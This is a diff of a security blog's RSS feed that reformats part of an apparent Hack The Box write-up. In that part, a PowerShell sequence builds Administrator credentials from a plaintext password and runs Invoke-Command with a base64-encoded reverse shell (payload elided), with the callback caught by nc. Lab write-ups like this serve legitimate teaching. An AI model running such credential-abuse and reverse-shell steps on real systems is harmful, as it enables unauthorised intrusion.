@@ -5,8 +5,8 @@
     <description>SecOps and HTB Write Ups</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 24 Sep 2024 12:04:22 -0400</pubDate>
-    <lastBuildDate>Tue, 24 Sep 2024 12:04:22 -0400</lastBuildDate>
+    <pubDate>Tue, 24 Sep 2024 17:41:28 -0400</pubDate>
+    <lastBuildDate>Tue, 24 Sep 2024 17:41:28 -0400</lastBuildDate>
     <generator>Jekyll v4.3.3</generator>
     
       <item>
@@ -583,29 +583,26 @@ sqlite&amp;gt; select * from user;
 
 &lt;h3 id=&quot;powershell-script-block&quot;&gt;Powershell Script block:&lt;/h3&gt;
 &lt;ul&gt;
-  &lt;li&gt;Lets run a script that will run as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt; and catch the callback with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; and get a reverse shell.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Store username and pass in variables.
-
-$username = &apos;Administrator&apos;
+  &lt;li&gt;
+    &lt;p&gt;Lets run a script that will run as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt; and catch the callback with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; and get a reverse shell.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Store username and pass in variables.
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$username = &apos;Administrator&apos;
 $password = &apos;ThisPasswordShouldDo!@&apos;
-
-Convert the pass to a secure string so you can pass it in a script block.
-
-$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
-
-Create a new-object so we can pass this together into the script.
-
-$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
-
-Now we are going to invoke a command using this object. Use a `base64 Encoded` powershell Reverse Shell.
-
-Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock { powershell -e JA&amp;lt;SNIP&amp;gt;CkA }
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Convert the pass to a secure string so you can pass it in a script block.
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Create a new-object so we can pass this together into the script.
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Now we are going to invoke a command using this object. Use a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64 Encoded&lt;/code&gt; powershell Reverse Shell.
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock { powershell -e JA&amp;lt;SNIP&amp;gt;CkA }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
   &lt;li&gt;Run the script and we should get our callback. Make sure you enter each command one at a time while under a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powershell&lt;/code&gt; console.&lt;/li&gt;
 &lt;/ul&gt;
 
